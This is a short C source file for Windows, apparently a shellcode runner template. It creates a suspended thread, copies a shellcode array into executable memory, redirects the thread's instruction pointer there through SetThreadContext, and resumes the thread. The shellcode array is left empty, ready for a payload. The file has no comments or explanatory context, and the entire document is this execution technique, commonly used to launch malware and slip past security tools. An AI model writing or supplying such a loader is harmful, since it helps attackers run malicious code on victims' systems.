#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

DWORD WINAPI dummyFunction(LPVOID lpParam) {
    return 0;
}

int main() {
    unsigned char shellcode[] = { 

    };

    unsigned char* pshellcode = shellcode;

    HANDLE hThread = CreateThread(NULL, 0, dummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread. Error code: %d\n", GetLastError());
        return 1;
    }

    LPVOID lpAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpAddress == NULL) {
        printf("VirtualAlloc failed with error code: %d\n", GetLastError());
        return 1;
    }

    memcpy(lpAddress, pshellcode, sizeof(shellcode));

    CONTEXT context;

    LPCONTEXT lpContext = &context;
    lpContext->ContextFlags = CONTEXT_ALL;


    if (!GetThreadContext(hThread, lpContext)) {
        printf("GetThreadContext failed with error code: %d\n", GetLastError());
        return 1;
    }

    lpContext->Rip = (DWORD64)lpAddress;

    if (!SetThreadContext(hThread, lpContext)) {
        printf("SetThreadContext failed with error code: %d\n", GetLastError());
        return 1;
    }

    ResumeThread(hThread);

    CloseHandle(hThread);


    
    printf("press enter to exit");
    getchar();

    return 0;

}
